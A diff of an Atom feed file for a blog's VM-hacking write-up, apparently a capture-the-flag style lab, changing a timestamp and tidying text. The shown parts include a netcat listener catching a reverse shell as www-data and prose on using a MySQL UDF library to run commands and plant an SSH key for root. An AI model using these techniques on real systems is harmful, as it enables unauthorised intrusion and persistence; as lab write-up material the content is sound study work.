@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Vm, | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/vm/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2014-11-03T22:20:39+01:00</updated>
+  <updated>2014-11-03T22:24:20+01:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -71,8 +71,7 @@ Nmap done: 1 IP address (1 host up) scanned in 39.73 seconds
 <p>In the netcat listener ($ added for clarity):</p>
 
 <pre><code class="bash">bas@tritonal:~$ nc -vlnp 7777
-nnetfd reuseport failed : Protocol not available
-listening on [any] 7777 ... : Protocol not available
+listening on [any] 7777 ... 
 connect to [10.8.7.1] from (UNKNOWN) [10.8.7.101] 39148
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -268,7 +267,7 @@ mysql&gt; show grants;
 1 row in set (0.01 sec)
 </code></pre>
 
-<p>Without going into detail, I made a script that uploaded <code>lib_mysql_udf</code> to the remote server. After registering the right command, this allowed me to run commands. In one go, builds the command to upload <code>lib_mysql_udf</code> and it adds my public key to the ssh keys of the root user:</p>
+<p>Without going into detail, I made a script that uploaded <code>lib_mysql_udf</code> to the remote server. After registering the right command, this allowed me to run commands. In one go, the script builds the SQL command to install <code>lib_mysql_udf</code> and adds my public key to the authorized SSH keys of the root user:</p>
 
 <pre><code class="bash">#!/bin/bash
 
